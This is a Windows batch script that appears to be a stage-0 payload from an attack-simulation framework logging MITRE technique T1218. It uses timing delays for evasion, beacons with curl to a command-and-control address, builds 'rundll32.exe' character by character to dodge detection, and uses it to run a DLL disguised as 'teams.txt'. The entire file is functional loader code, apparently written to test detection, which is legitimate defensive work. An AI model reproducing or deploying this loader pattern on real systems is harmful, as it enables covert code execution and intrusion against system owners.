@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants - never encoded
SET yktnwwf=%APPDATA%\8857\b205101b
SET fpakbq=Macula-Stage0-8857
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8857-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=teams.txt
SET fpldhe=8857
SET xzxwv=%APPDATA%\!yydue!\macula-simulations.log

REM Initial delay 30-60s
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_start=initial_delay_complete>> "!xzxwv!" 2>nul

REM C2 heartbeat (first operation, not obfuscated)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start=!rdzgrnne!>> "!xzxwv!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
if errorlevel 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_failed=errorlevel_!errorlevel!>> "!xzxwv!" 2>nul
) else (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_success=complete>> "!xzxwv!" 2>nul
)

REM Delay 5-15s
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay1=ping_8_complete>> "!xzxwv!" 2>nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!xzxwv!" 2>nul
cd /d "!yktnwwf!" 2>nul
if errorlevel 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_failed=access_denied>> "!xzxwv!" 2>nul
    SET rsltttp=0
    SET errdtl=dir_change_failed
) else (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_success=complete>> "!xzxwv!" 2>nul
    SET rsltttp=1
    SET errdtl=
)

REM Random delay 10-30s
SET /A rnddly=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_start=!rnddly!s>> "!xzxwv!" 2>nul
timeout /t !rnddly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_end=complete>> "!xzxwv!" 2>nul

REM Obfuscated LOLBin: rundll32.exe character-by-character
SET c1=r
SET c2=u
SET c3=n
SET c4=d
SET c5=l
SET c6=l
SET c7=3
SET c8=2
SET c9=.
SET c10=e
SET c11=x
SET c12=e
SET lolbinexe=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%%c12%

REM Execute T1218 Signed Binary Proxy Execution
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: t1218_start=!lolbinexe! !edjwtl!,DllMain>> "!xzxwv!" 2>nul
!lolbinexe! !edjwtl!,DllMain
if errorlevel 1 (
    SET rsltttp=0
    SET errdtl=dll_load_failed
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: t1218_failed=errorlevel_!errorlevel!>> "!xzxwv!" 2>nul
) else (
    SET rsltttp=1
    SET errdtl=
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: t1218_success=complete>> "!xzxwv!" 2>nul
)

REM Final delay and TTP logging
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay=complete>> "!xzxwv!" 2>nul

REM TTP logging with normalized timestamp
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET ymd=%%c-%%b-%%a
SET tpstamp=!ymd! !TIME:~0,8!.000
echo [!tpstamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!rsltttp!:!errdtl!>> "!xzxwv!" 2>nul